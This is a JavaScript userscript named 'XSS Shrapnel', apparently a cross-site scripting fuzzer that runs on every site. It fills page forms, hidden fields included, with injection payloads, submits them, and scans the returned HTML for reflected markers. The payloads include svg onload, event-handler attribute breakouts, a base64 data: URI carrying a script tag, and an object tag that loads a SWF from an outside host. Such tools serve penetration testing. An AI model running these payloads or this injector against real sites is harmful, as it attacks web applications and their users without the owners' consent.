// ==UserScript==
// @name        XSS Shrapnel
// @namespace   *
// @description aaa"bbb'ccc<ddd>eee
// @include     *
// @version     2.3
// @grant       none
// ==/UserScript==

var bForceUrlEncoded = 1
var bFillHiddenForms = 0

var iPayload = 0

var aPayloads = ['aaa"bbb\'ccc<ddd>eee', 
		 'aaa"bbb\'eee', 
		 'aaa"eee', 
		 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>eee<fff', 
		 'aaa\\"bbb\\\'ccc<ddd >eee</fff>', 
		 '</title></textarea>aaa"bbb\'ccc<ddd>eee', 
		 'aaa"><svg onload=alert(document.domain)>eee', 
		 'aaa" autofocus onfocus="alert(document.domain)"eee', 
		 'aaa" onmouseover="alert(document.domain)"eee', 
		 'aaa" accesskey=x onclick="alert(document.domain)"eee', 
		 'aaa\'-alert(document.domain)-\'eee', 
		 'aaa"-alert(document.domain)-"eee', 
		 'aaa"><video src onratechange=prompt(document.domain)>eee', 
		 'aaa"><object allowscriptaccess="always" data="http://spqr.zz.mu/xss.swf"></object>eee', 
		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>eee']

var regex = /.{0,100}aaa.{0,100}?eee.{0,100}/gi

window.addEventListener
(
	'keydown', 
	function (e)
	{
		if (e.altKey || e.modifiers)
		{
			if (e.keyCode == 72)
			{
				var sPrompt = prompt ('Fill hidden forms?', bFillHiddenForms)
				
				sPrompt === null || (bFillHiddenForms = parseInt (sPrompt))
			}
			
			if (e.keyCode == 80)
			{
				var sPrompt = prompt ('Set payload', iPayload)
				
				if (sPrompt !== null)
				{
					if (isNaN (+sPrompt))
					{
						aPayloads.push (sPrompt)
						
						iPayload = aPayloads.indexOf (sPrompt)
					}
					else
						iPayload = parseInt (sPrompt) % aPayloads.length
				}
				
				prompt ('Payload', aPayloads [iPayload])
			}
			
			if (e.target.form)
			{
				var parentForm = e.target.form
				
				e.keyCode == 83 && submitForm (parentForm)
				e.keyCode == 65 && fillForm (parentForm) && submitForm (parentForm)
			}
			
			if (e.keyCode == 70)
				fillForms ()
			
			if (e.keyCode == 82)
				checkResults ()
		}
	}, 
	false
)

window.addEventListener ('DOMContentLoaded', checkResults, false)
window.addEventListener ('load', checkResults, false)

function checkResults ()
{
	var matches = document.getElementsByTagName ('html') [0].innerHTML.match (regex)
	
	if (matches instanceof Array)
	{
		matches = matches.join ('\r\n\r\n').split (/([\s\S]{10000})/)
		
		matches.forEach (function (i) {i && alert (i)})
	}
}

function fillForms ()
{
	for (var i = 0; i < document.forms.length; i++)
	{
		var form = document.forms [i]
		
		form.target = '_blank'
		
		fillForm (form) && submitForm (form)
	}
}

function submitForm (form)
{
	var aPostData = []
	
	for (var i = 0; i < form.length; i++)
	{
		var sPostData = encodeURIComponent (form [i].name) + '=' + encodeURIComponent (form [i].value)
		
		form [i].name && aPostData.indexOf (sPostData) == -1 && aPostData.push (sPostData)
	}
	
	bForceUrlEncoded && (form.enctype = 'application/x-www-form-urlencoded')
	
	//	var sFormAction = form.getAttribute ('action')
	//
	//	if (!/^https?:\/\//.test (sFormAction))
	//		sFormAction = /\/\//.test (sFormAction) ? location.protocol + sFormAction : location.origin + sFormAction
	
	var sFormAction = form.action ? form.action : location.origin + location.pathname
	var sDelimeter = form.method == 'post' ? '\r\n\r\n' : '?'
	
	var sFormData = sFormAction + sDelimeter + aPostData.join ('&')
	
	confirm (sFormData) && HTMLFormElement.prototype.submit.call (form)
}

function fillForm (form)
{
	for (var i = 0; i < form.length; i++)
	{
		var element = form [i]
		var payload = aPayloads [iPayload]
		
		if (element.tagName == 'SELECT' || element.type == 'file')
		{
			element.outerHTML = '<input name="' + htmlEncode (element.name) + '" value="' + htmlEncode (payload) + '" />'
			
			continue
		}
		
		if (!bFillHiddenForms && element.type == 'hidden')
			continue
			
		element.value = payload
	}
	
	return 1
}

function htmlEncode (str)
{
	return str.replace (/</g, '&lt;').replace (/>/g, '&gt;').replace (/"/g, '&quot;').replace (/'/g, '&#39;')
}
